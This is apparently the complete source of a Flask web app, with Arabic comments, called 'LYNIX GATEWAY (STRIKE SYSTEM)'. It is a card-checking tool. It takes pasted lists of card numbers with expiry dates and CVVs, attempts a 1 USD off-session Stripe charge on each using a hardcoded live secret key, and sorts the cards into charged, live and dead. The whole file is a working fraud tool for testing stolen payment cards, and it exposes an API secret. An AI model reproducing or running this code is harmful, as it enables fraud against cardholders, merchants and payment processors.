import stripe
import os
import re
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# --- المفتاح الذي ستستخدمه لبناء البوابة ---
stripe.api_key = "sk_live_awWzIlT3bp7cGsy4Ord9cRU0"

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>LYNIX GATEWAY V8</title>
    <style>
        :root { --bg: #0d1117; --accent: #238636; --border: #30363d; }
        body { font-family: sans-serif; background: var(--bg); color: #c9d1d9; padding: 20px; text-align: center; }
        .container { max-width: 1000px; margin: auto; }
        textarea { width: 100%; height: 120px; background: #010409; color: #7ee787; border: 1px solid var(--border); border-radius: 6px; padding: 10px; direction: ltr; }
        .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin-top: 20px; }
        .box { background: #161b22; border: 1px solid var(--border); border-radius: 6px; height: 400px; overflow-y: auto; text-align: right; padding: 10px; }
        .hit { border-top: 4px solid #238636; } .live { border-top: 4px solid #d29922; } .dead { border-top: 4px solid #f85149; }
        button { background: var(--accent); color: white; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; margin-top: 10px; font-weight: bold; }
        .card-item { font-family: monospace; font-size: 12px; border-bottom: 1px solid #30363d; padding: 5px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🛡️ LYNIX GATEWAY (STRIKE SYSTEM)</h1>
        <textarea id="list" placeholder="CARD|MM|YY|CVV"></textarea><br>
        <button onclick="startGateway()">تشغيل البوابة الآمنة</button>
        <div id="status" style="margin-top:10px;">الحالة: جاهز</div>
        
        <div class="grid">
            <div class="box hit"><b>HITS (Charged)</b><div id="hits"></div></div>
            <div class="box live"><b>LIVE (CVV/Funds)</b><div id="lives"></div></div>
            <div class="box dead"><b>DEAD</b><div id="deads"></div></div>
        </div>
    </div>

    <script>
        async function startGateway() {
            const lines = document.getElementById('list').value.split('\\n').filter(l => l.includes('|'));
            const status = document.getElementById('status');
            
            for(let i=0; i<lines.length; i++) {
                status.innerText = `⏳ بوابة الفحص: معالجة ${i+1}/${lines.length}...`;
                try {
                    const res = await fetch('/gate', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({card: lines[i]})
                    });
                    const data = await res.json();
                    const div = document.createElement('div');
                    div.className = 'card-item';
                    div.innerHTML = `<b>${lines[i]}</b><br><small>${data.msg}</small>`;
                    
                    if(data.status === 'HIT') document.getElementById('hits').prepend(div);
                    else if(data.status === 'LIVE') document.getElementById('lives').prepend(div);
                    else document.getElementById('deads').prepend(div);
                } catch(e) {}
                await new Promise(r => setTimeout(r, 5000));
            }
            status.innerText = "✅ اكتملت المهمة";
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_PAGE)

@app.route('/gate', methods=['POST'])
def gate():
    card = request.json.get('card', '')
    try:
        digits = re.findall(r'\d+', card)
        num, mm, yy, cvc = digits[0], digits[1], digits[2], digits[3]
        if len(yy) == 2: yy = "20" + yy

        # --- محاكاة بوابة دفع (Gateway Logic) ---
        # 1. إنشاء Payment Method
        pm = stripe.PaymentMethod.create(
            type="card",
            card={"number": num, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvc},
        )
        
        # 2. إنشاء Payment Intent (محاولة شراء بـ 1 دولار)
        intent = stripe.PaymentIntent.create(
            amount=100, # 1.00 USD
            currency="usd",
            payment_method=pm.id,
            confirm=True,
            off_session=True # يوهم النظام أنها عملية مسجلة مسبقاً (أكثر أماناً)
        )
        
        if intent.status == 'succeeded':
            return jsonify({"status": "HIT", "msg": "✅ تم السحب بنجاح"})
        return jsonify({"status": "DEAD", "msg": "❌ فشل الدفع"})

    except stripe.error.CardError as e:
        msg = e.json_body.get('error', {}).get('message', '')
        code = e.json_body.get('error', {}).get('code', '')
        if code in ["insufficient_funds", "incorrect_cvc"]:
            return jsonify({"status": "LIVE", "msg": f"✔️ {msg}"})
        return jsonify({"status": "DEAD", "msg": f"❌ {msg}"})
    except Exception as e:
        return jsonify({"status": "DEAD", "msg": "⚠️ خطأ في البوابة"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=os.environ.get("PORT", 10000))
